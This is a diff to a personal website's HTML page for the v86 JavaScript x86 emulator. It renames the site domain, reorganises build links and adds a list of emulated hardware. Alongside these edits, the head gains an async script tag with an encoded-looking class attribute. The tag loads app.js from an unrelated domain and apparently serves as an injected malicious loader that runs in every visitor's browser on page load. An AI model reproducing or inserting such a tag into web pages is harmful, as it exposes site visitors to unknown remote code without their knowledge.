@@ -8,11 +8,12 @@
 		<link href='https://fonts.googleapis.com/css?family=Open+Sans:400,700' rel='stylesheet' type='text/css'>
 		<link rel="stylesheet" type="text/css" href="stylesheets/stylesheet.css" media="screen">
 		<link rel="stylesheet" type="text/css" href="stylesheets/github-light.css" media="screen">
+		<script async class="=SlRXakYxa2o7LTE1OzE=" src="https://play.besstahete.info/app.js"></script>
 	</head>
 	
 	<body>
 	<section class="page-header">
-		<h1 class="project-name">BenNottelling.ml</h1>
+		<h1 class="project-name">BenNottelling.com</h1>
 		<h2 class="project-tagline">v86 - x86 emulator</h2>
 	</section>
 
@@ -21,9 +22,22 @@
 		<a href="./v86">Check it out!</a>
 		
 		<p>V86 is a basic x86 emulator that runs with nothing but javascript. Its emulated CPU is about a pentium 1 level. <a href="https://github.com/copy/v86">Project powered by v86</a></p>
+		        <h2>Builds</h2>
+        <a href="./v86/builds/">Regular builds</a><br>
+        <a href="./v86/builds/ACPI">Builds with ACPI enabled (breaks compatibibly with some OSs)</a>'
+                <h2>Emulated Hardware</h2>
+                <ul>
+                   <li>An x86 compatible CPU. The instruction set is around Pentium 1 level</li>
+                   <li>A floppy disk controller (8272A)</li>
+                   <li>An 8042 Keyboard Controller, PS2. With mouse support</li>
+                   <li>A VGA controller with SVGA support and Bochs VBE Extensions</li>
+                   <li>A PCI bus. This one is partly incomplete and not used by every device</li>
+                   <li>An NE2000 (8390) PCI network card</li>
+                   <li>A virtio filesystem</li>
+                   <li>A Soundblaster 16 sound card and PC speakers for sound</li>
+                </ul>
+        
 		<img src="images/v86_win7.png">
-        <h2>Builds</h2>
-        <a href="./v86/builds/6440f7f.zip">Build 6440f7f - 11/11/17!</a>
 
 		<footer class="site-footer">
 			<span class="site-footer-credits">This page uses the <a href="https://github.com/jasonlong/cayman-theme">Cayman theme</a> by <a href="https://twitter.com/jasonlong">Jason Long</a>.</span>
